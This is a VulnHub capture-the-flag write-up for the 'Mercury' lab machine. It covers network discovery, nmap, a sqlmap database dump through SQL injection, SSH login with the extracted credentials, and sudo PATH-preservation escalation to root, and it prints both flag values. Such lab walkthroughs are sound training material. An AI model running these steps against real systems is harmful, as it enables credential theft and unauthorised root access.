
# 🌌 The Planets: Mercury – VulnHub Write-up

**Difficulty:** Easy  
**Objective:** Gain root access and retrieve two flags: `user_flag.txt` and `root_flag.txt`

---

## 1. 🔍 Finding the IP Address

To begin, network discovery was conducted using Netdiscover to identify the IP address of the Mercury machine:

```bash
netdiscover -r 192.168.56.0/24
```

**Discovered IP:** `192.168.56.105`

---

## 2. 🚪 Port Scanning

A full port scan was performed using Nmap to identify open services:

```bash
nmap -sV 192.168.56.105
```

The web service on port 8080 appeared under development, but offered a starting point for enumeration.

---

## 3. 🌐 Web Enumeration and SQL Injection

Accessing the web service on port 8080 revealed a message indicating the site was under construction. An error page hinted at an interesting folder: `/mercuryfacts/`, which appeared to query a SQL database.

Use sqlmap to extract database contents:

```bash
sqlmap http://192.168.56.105:8080/mercuryfacts/ -D mercury --dump-all --batch
```

---

## 4. 🔐 SSH Access

With credentials extracted from the database, log into SSH:

```bash
ssh webmaster@192.168.56.105
```

Once logged in as the 'webmaster' user, retrieve the first flag:

**User flag:** `user_flag_8339915c9a454657bd60ee58776f4ccd`

---

## 5. 📓 Discovering Further Credentials

Inside the `webmaster` home directory, view the `Notes.txt` file:

```bash
cat Notes.txt
```

This file reveals credentials for a second user: `linuxmaster`.

Use the discovered credentials to SSH into that account:

```bash
ssh linuxmaster@localhost
```

---

## 6. 🏁 Root Access

From the `linuxmaster` account, escalate privileges using `sudo`:

```bash
sudo --preserve-env=PATH /bin/bash
```

This command preserves environment variables and grants a root shell. Retrieve the root flag:

```bash
cat /root/root_flag.txt
```

**Root flag:** `root_flag_69426d9fda579afbffd9c2d47ca31d90`

---
